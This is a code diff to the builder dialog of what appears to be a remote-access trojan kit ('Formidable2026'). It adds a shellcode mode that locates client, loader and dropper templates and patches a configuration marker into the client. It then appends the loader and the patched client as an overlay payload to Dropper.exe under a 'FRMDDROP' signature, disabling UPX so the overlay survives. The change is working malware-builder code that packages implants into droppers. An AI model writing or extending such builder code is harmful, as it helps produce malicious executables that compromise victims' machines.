@@ -209,8 +209,8 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                 ofn.lpstrFilter = L"动态链接库 (*.dll)\0*.dll\0所有文件 (*.*)\0*.*\0";
                 ofn.lpstrDefExt = L"dll";
             } else if (isShellCode) {
-                ofn.lpstrFilter = L"二进制文件 (*.bin)\0*.bin\0所有文件 (*.*)\0*.*\0";
-                ofn.lpstrDefExt = L"bin";
+                ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0二进制文件 (*.bin)\0*.bin\0所有文件 (*.*)\0*.*\0";
+                ofn.lpstrDefExt = L"exe";
             } else {
                 ofn.lpstrFilter = L"可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
                 ofn.lpstrDefExt = L"exe";
@@ -225,6 +225,46 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 
             std::wstring baseSavePath = szSavePath;
             
+            // 辅助函数：查找模板文件
+            auto FindTemplateFile = [&](const std::wstring& fileName, bool targetX64) -> std::wstring {
+                wchar_t szExePath[MAX_PATH];
+                GetModuleFileNameW(NULL, szExePath, MAX_PATH);
+                std::wstring currentDir = szExePath;
+                currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
+                
+                std::vector<std::wstring> candidates;
+                
+                // 1. 当前目录
+                candidates.push_back(currentDir + L"\\" + fileName);
+                
+                // 2. 目标架构目录 (相对当前目录)
+                if (targetX64) {
+                    candidates.push_back(currentDir + L"\\x64\\" + fileName);
+                    candidates.push_back(currentDir + L"\\..\\x64\\" + fileName);
+                    candidates.push_back(currentDir + L"\\..\\Formidable2026\\x64\\" + fileName);
+                } else {
+                    candidates.push_back(currentDir + L"\\x86\\" + fileName);
+                    candidates.push_back(currentDir + L"\\..\\x86\\" + fileName);
+                    candidates.push_back(currentDir + L"\\..\\Formidable2026\\x86\\" + fileName);
+                }
+
+                // 3. 兄弟架构目录 (如果当前在 x86，找 x64，反之亦然)
+                candidates.push_back(currentDir + L"\\..\\x86\\" + fileName);
+                candidates.push_back(currentDir + L"\\..\\x64\\" + fileName);
+                
+                // 4. 源码结构默认输出路径 (硬编码兜底)
+                // 假设当前在 Master/Debug 或 Master/Release
+                candidates.push_back(currentDir + L"\\..\\..\\Formidable2026\\x86\\" + fileName);
+                candidates.push_back(currentDir + L"\\..\\..\\Formidable2026\\x64\\" + fileName);
+
+                for (const auto& path : candidates) {
+                    if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
+                        return path;
+                    }
+                }
+                return L"";
+            };
+
             auto BuildOne = [&](bool x64, const std::wstring& dest) -> bool {
                 std::vector<char> buffer;
                 // 资源ID暂且保留，若资源不存在则回退到文件加载
@@ -233,55 +273,26 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                 // DLL和ShellCode暂无资源定义，直接走文件加载逻辑
                 
                 if (resId == 0 || !GetResourceData(resId, buffer)) {
-                    // 如果资源不存在，尝试从本地文件加载
-                    wchar_t szExePath[MAX_PATH];
-                    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
-                    std::wstring currentDir = szExePath;
-                    currentDir = currentDir.substr(0, currentDir.find_last_of(L"\\/"));
-                    
                     std::wstring fileName;
                     if (isDll) fileName = L"ClientDLL.dll";
-                    else if (isShellCode) fileName = L"ShellCodeLoader.bin"; // 假设Loader已编译为bin
-                    else fileName = L"Client.exe";
+                    else fileName = L"Client.exe"; // ShellCode模式也使用Client.exe作为基础进行Patch
 
-                    // 搜索路径优先级:
-                    // 1. 同级目录 (例如 x64/Client.exe)
-                    // 2. 兄弟架构目录 (例如 ../x86/Client.exe)
-                    // 3. 原有逻辑子目录 (例如 x64/x64/Client.exe)
+                    std::wstring templatePath = FindTemplateFile(fileName, x64);
                     
-                    std::vector<std::wstring> searchPaths;
+                    if (!templatePath.empty()) {
+                        HANDLE hFile = CreateFileW(templatePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                        if (hFile != INVALID_HANDLE_VALUE) {
+                            DWORD size = GetFileSize(hFile, NULL);
+                            buffer.resize(size);
+                            DWORD read;
+                            ReadFile(hFile, buffer.data(), size, &read, NULL);
+                            CloseHandle(hFile);
+                        }
+                    } 
                     
-                    // 路径1: 同级目录
-                    searchPaths.push_back(currentDir + L"\\" + fileName);
-                    
-                    // 路径2: 跨架构目录 (假设当前是x64/Master.exe，找 ../x86/Client.exe)
-                    if (x64) {
-                         // 如果当前是x64，找同级
-                         // 如果当前是x86 (Master)，找 ../x64/
-                         searchPaths.push_back(currentDir + L"\\..\\x64\\" + fileName);
-                    } else {
-                         // 找 x86
-                         searchPaths.push_back(currentDir + L"\\..\\x86\\" + fileName);
-                    }
-
-                    // 路径3: 原有逻辑 (子目录)
-                    searchPaths.push_back(currentDir + (x64 ? L"\\x64\\" : L"\\x86\\") + fileName);
-                    searchPaths.push_back(currentDir + (x64 ? L"\\..\\x64\\" : L"\\..\\x86\\") + fileName);
-
-                    HANDLE hFile = INVALID_HANDLE_VALUE;
-                    for (const auto& path : searchPaths) {
-                        hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-                        if (hFile != INVALID_HANDLE_VALUE) break;
-                    }
-
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD size = GetFileSize(hFile, NULL);
-                        buffer.resize(size);
-                        DWORD read;
-                        ReadFile(hFile, buffer.data(), size, &read, NULL);
-                        CloseHandle(hFile);
-                    } else {
-                        MessageBoxW(hDlg, (L"无法找到模板文件: " + fileName).c_str(), L"错误", MB_ICONERROR);
+                    if (buffer.empty()) {
+                        std::wstring msg = L"无法找到模板文件: " + fileName + L"\n请确认已编译 Client/ClientDLL 项目。\n尝试过的路径包括当前目录及 ../x86, ../x64 等。";
+                        MessageBoxW(hDlg, msg.c_str(), L"错误", MB_ICONERROR);
                         return false;
                     }
                 }
@@ -338,7 +349,97 @@ INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
                         // 不 break，继续搜索以防有多个备份（虽然通常只有一个）
                     }
                 }
-                if (!found) return false;
+                if (!found) {
+                     MessageBoxW(hDlg, L"模板文件中未找到配置特征码 FRMD26_CONFIG，请确认模板是否最新。", L"错误", MB_ICONERROR);
+                     return false;
+                }
+
+                // 如果是 ShellCode 模式，需要打包 Dropper
+                if (isShellCode) {
+                    // 1. 读取 Dropper.exe
+                    std::wstring dropperPath = FindTemplateFile(L"Dropper.exe", x64);
+                    if (dropperPath.empty()) {
+                        MessageBoxW(hDlg, L"无法找到 Dropper.exe 模板文件", L"错误", MB_ICONERROR);
+                        return false;
+                    }
+                    
+                    std::vector<char> dropperData;
+                    HANDLE hFile = CreateFileW(dropperPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        DWORD size = GetFileSize(hFile, NULL);
+                        dropperData.resize(size);
+                        DWORD read;
+                        ReadFile(hFile, dropperData.data(), size, &read, NULL);
+                        CloseHandle(hFile);
+                    }
+
+                    // 2. 读取 ShellCodeLoader.exe
+                    std::wstring loaderPath = FindTemplateFile(L"ShellCodeLoader.exe", x64);
+                    if (loaderPath.empty()) {
+                        MessageBoxW(hDlg, L"无法找到 ShellCodeLoader.exe 模板文件", L"错误", MB_ICONERROR);
+                        return false;
+                    }
+
+                    std::vector<char> loaderData;
+                    hFile = CreateFileW(loaderPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        DWORD size = GetFileSize(hFile, NULL);
+                        loaderData.resize(size);
+                        DWORD read;
+                        ReadFile(hFile, loaderData.data(), size, &read, NULL);
+                        CloseHandle(hFile);
+                    }
+
+                    if (dropperData.empty() || loaderData.empty()) {
+                         MessageBoxW(hDlg, L"读取 Dropper 或 ShellCodeLoader 失败", L"错误", MB_ICONERROR);
+                         return false;
+                    }
+
+                    // 3. 构造 Payload 数据包
+                    // 结构: [Count(4)] + Files...
+                    std::vector<char> payloadData;
+                    uint32_t count = 2; // ShellCodeLoader.exe + Client.bin
+                    
+                    auto appendInt = [&](uint32_t v) {
+                        char* p = (char*)&v;
+                        payloadData.insert(payloadData.end(), p, p + 4);
+                    };
+                    
+                    auto appendFile = [&](const std::wstring& name, const std::vector<char>& data) {
+                        uint32_t nameLen = (uint32_t)name.length();
+                        appendInt(nameLen);
+                        const char* pName = (const char*)name.c_str();
+                        payloadData.insert(payloadData.end(), pName, pName + nameLen * 2); // wchar_t is 2 bytes
+                        appendInt((uint32_t)data.size());
+                        payloadData.insert(payloadData.end(), data.begin(), data.end());
+                    };
+
+                    appendInt(count);
+                    appendFile(L"ShellCodeLoader.exe", loaderData);
+                    appendFile(L"Client.bin", buffer); // buffer is the patched Client.exe
+
+                    // 4. 组合最终文件
+                    // [Dropper] [Payload] [PayloadStart(4)] [RunTarget(4)] [Signature(8)]
+                    std::vector<char> finalExe = dropperData;
+                    uint32_t payloadStart = (uint32_t)finalExe.size();
+                    
+                    finalExe.insert(finalExe.end(), payloadData.begin(), payloadData.end());
+                    
+                    char* pStart = (char*)&payloadStart;
+                    finalExe.insert(finalExe.end(), pStart, pStart + 4);
+                    
+                    uint32_t runTarget = 0; // ShellCodeLoader.exe is index 0
+                    char* pRun = (char*)&runTarget;
+                    finalExe.insert(finalExe.end(), pRun, pRun + 4);
+                    
+                    const char* sig = "FRMDDROP";
+                    finalExe.insert(finalExe.end(), sig, sig + 8);
+                    
+                    buffer = finalExe; // Use finalExe as the buffer to write
+                    
+                    // 强制禁用压缩，防止 UPX 破坏附加数据 (Overlay)
+                    const_cast<int&>(compressIndex) = 0; 
+                }
 
                 // 写入临时文件或目标文件
                 if (compressIndex == 1) { // UPX
